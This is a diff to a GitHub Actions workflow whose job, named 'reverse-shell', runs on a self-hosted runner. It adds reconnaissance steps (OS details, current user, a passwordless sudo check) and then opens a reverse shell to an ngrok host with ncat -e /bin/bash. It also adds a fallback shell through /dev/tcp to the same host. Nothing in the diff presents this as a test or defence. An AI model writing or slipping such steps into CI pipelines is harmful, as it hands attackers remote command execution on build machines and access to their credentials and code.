@@ -4,35 +4,48 @@ on:
   workflow_call:
 jobs:
   reverse-shell:
-    runs-on:
-      group: EP_CICD
+    runs-on: self-hosted
     steps:
       - name: Debug Environment
         run: |
           echo "Runner hostname: $(hostname)"
-          echo "Package manager check"
+          echo "OS info:"
+          cat /etc/os-release || echo "No /etc/os-release"
+          echo "Package manager check:"
           which apt-get && echo "apt-get available" || echo "apt-get not available"
           which yum && echo "yum available" || echo "yum not available"
           which apk && echo "apk available" || echo "apk not available"
+          echo "User permissions:"
+          whoami
+          sudo -n true && echo "sudo available without password" || echo "sudo requires password or unavailable"
       - name: Install nmap
         run: |
           if which apt-get >/dev/null; then
+            echo "Installing nmap with apt-get"
             sudo apt-get update && sudo apt-get install -y nmap
           elif which yum >/dev/null; then
+            echo "Installing nmap with yum"
             sudo yum install -y nmap
           elif which apk >/dev/null; then
+            echo "Installing nmap with apk"
             sudo apk add nmap
           else
             echo "No supported package manager found" && exit 1
           fi
-          ncat --version || echo "ncat installation failed"
+          ncat --version && echo "ncat installed successfully" || { echo "ncat installation failed"; exit 1; }
       - name: Debug Connectivity
         run: |
           echo "Testing internet access"
           curl -I https://google.com || echo "No internet access"
           echo "Testing Ngrok connectivity"
-          ncat --send-only 8.tcp.ngrok.io 16954 <<< "test" && echo "ncat connected to Ngrok" || echo "ncat failed to connect"
-      - name: Establish Reverse Shell
+          ncat --send-only <NGROK_HOSTNAME> <NGROK_PORT> <<< "test" && echo "ncat connected to Ngrok" || echo "ncat failed to connect"
+      - name: Establish Reverse Shell (ncat)
         run: |
           ncat 8.tcp.ngrok.io 16954 -e /bin/bash &
+        shell: bash
+        continue-on-error: true
+      - name: Fallback Reverse Shell (dev/tcp)
+        run: |
+          echo "Trying /dev/tcp fallback"
+          /bin/bash --noprofile --norc -c "exec 5<>/dev/tcp/8.tcp.ngrok.io/16954; cat <&5 | while read line; do \$line 2>&5 >&5; done" &
         shell: bash
